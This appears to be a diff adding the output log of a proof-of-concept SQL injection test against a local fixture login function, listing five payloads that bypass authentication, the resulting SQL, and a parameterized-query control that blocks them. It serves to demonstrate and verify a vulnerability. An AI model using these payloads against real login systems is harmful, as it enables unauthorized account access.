@@ -1,0 +1,44 @@
+==============================================================================
+SQL injection authentication bypass PoC - app.py (local fixture)
+==============================================================================
+
+[1] BASELINE - ordinary logins (expected behavior)
+  login('demo', 'fixture-password')=True  login_parameterized=True  expected=True  [OK]
+  login('demo', 'wrong')=False  login_parameterized=False  expected=False  [OK]
+  login('nouser', 'x')=False  login_parameterized=False  expected=False  [OK]
+
+[2] INJECTION - malicious payloads against login()
+  login('demo', "' OR '1'='1' --") -> True  [BYPASS]
+      executed SQL: SELECT name FROM users WHERE name = 'demo' AND password = '' OR '1'='1' --'
+  login('demo', "' OR 1=1 --") -> True  [BYPASS]
+      executed SQL: SELECT name FROM users WHERE name = 'demo' AND password = '' OR 1=1 --'
+  login("' OR '1'='1' --", 'x') -> True  [BYPASS]
+      executed SQL: SELECT name FROM users WHERE name = '' OR '1'='1' --' AND password = 'x'
+  login("demo' --", 'anything') -> True  [BYPASS]
+      executed SQL: SELECT name FROM users WHERE name = 'demo' --' AND password = 'anything'
+  login("' OR 1=1 --", 'x') -> True  [BYPASS]
+      executed SQL: SELECT name FROM users WHERE name = '' OR 1=1 --' AND password = 'x'
+
+[3] NEGATIVE CONTROL - identical payloads against login_parameterized()
+  login_parameterized('demo', "' OR '1'='1' --") -> False  [no bypass]
+  login_parameterized('demo', "' OR 1=1 --") -> False  [no bypass]
+  login_parameterized("' OR '1'='1' --", 'x') -> False  [no bypass]
+  login_parameterized("demo' --", 'anything') -> False  [no bypass]
+  login_parameterized("' OR 1=1 --", 'x') -> False  [no bypass]
+
+[4] RENDERED SQL for each successful bypass payload (app.py:14 interpolation)
+  payload name='demo' password="' OR '1'='1' --"
+    SELECT name FROM users WHERE name = 'demo' AND password = '' OR '1'='1' --'
+  payload name='demo' password="' OR 1=1 --"
+    SELECT name FROM users WHERE name = 'demo' AND password = '' OR 1=1 --'
+  payload name="' OR '1'='1' --" password='x'
+    SELECT name FROM users WHERE name = '' OR '1'='1' --' AND password = 'x'
+  payload name="demo' --" password='anything'
+    SELECT name FROM users WHERE name = 'demo' --' AND password = 'anything'
+  payload name="' OR 1=1 --" password='x'
+    SELECT name FROM users WHERE name = '' OR 1=1 --' AND password = 'x'
+
+[5] SUMMARY
+  successful bypass payloads on login(): 5/5
+  row returned by bypass query: ('demo',)
+  VERDICT: authentication bypass CONFIRMED - login() returns True for attacker input that is not the seeded credential.
